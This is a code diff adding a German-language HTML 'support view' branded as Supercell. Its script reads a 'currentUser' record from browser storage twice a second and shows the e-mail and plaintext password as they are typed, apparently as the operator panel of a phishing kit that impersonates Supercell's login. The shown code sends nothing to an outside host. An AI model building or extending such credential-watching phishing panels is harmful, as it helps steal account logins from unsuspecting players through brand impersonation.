@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Supercell - Support-Ansicht</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .support-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .title {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .user-info {
+            background: #f8f8f8;
+            padding: 20px;
+            border-radius: 4px;
+            margin-top: 20px;
+            border-left: 4px solid #4CAF50;
+        }
+        .no-user {
+            text-align: center;
+            color: #666;
+            font-style: italic;
+            padding: 20px;
+        }
+        .info-row {
+            margin-bottom: 10px;
+        }
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+        .status-active {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .status-inactive {
+            color: #f44336;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="support-container">
+        <h2 class="title">Supercell Support - Benutzeraktivität</h2>
+        <div id="userActivity">
+            <div class="no-user">Warte auf Benutzeraktivität...</div>
+        </div>
+    </div>
+
+    <script>
+        function checkUserActivity() {
+            const userActivityDiv = document.getElementById('userActivity');
+            const userData = localStorage.getItem('currentUser');
+
+            if (userData) {
+                const user = JSON.parse(userData);
+                const timeSinceUpdate = Date.now() - user.lastUpdate;
+                const isActive = timeSinceUpdate < 2000; // 2 Sekunden Timeout
+
+                userActivityDiv.innerHTML = `
+                    <div class="user-info">
+                        <div class="info-row">
+                            <strong>Status:</strong> 
+                            <span class="${isActive ? 'status-active' : 'status-inactive'}">
+                                ${isActive ? 'Aktiv' : 'Inaktiv'}
+                            </span>
+                        </div>
+                        <div class="info-row">
+                            <strong>E-Mail:</strong> ${user.email || 'Noch nicht eingegeben'}
+                        </div>
+                        <div class="info-row">
+                            <strong>Passwort:</strong> ${user.password || 'Noch nicht eingegeben'}
+                        </div>
+                        <div class="timestamp">
+                            Letzte Aktivität: ${user.timestamp}
+                        </div>
+                    </div>
+                `;
+            } else {
+                userActivityDiv.innerHTML = '<div class="no-user">Warte auf Benutzeraktivität...</div>';
+            }
+        }
+
+        // Regelmäßige Überprüfung der Benutzeraktivität
+        setInterval(checkUserActivity, 500);
+
+        // Initiale Überprüfung
+        checkUserActivity();
+    </script>
+</body>
+</html>
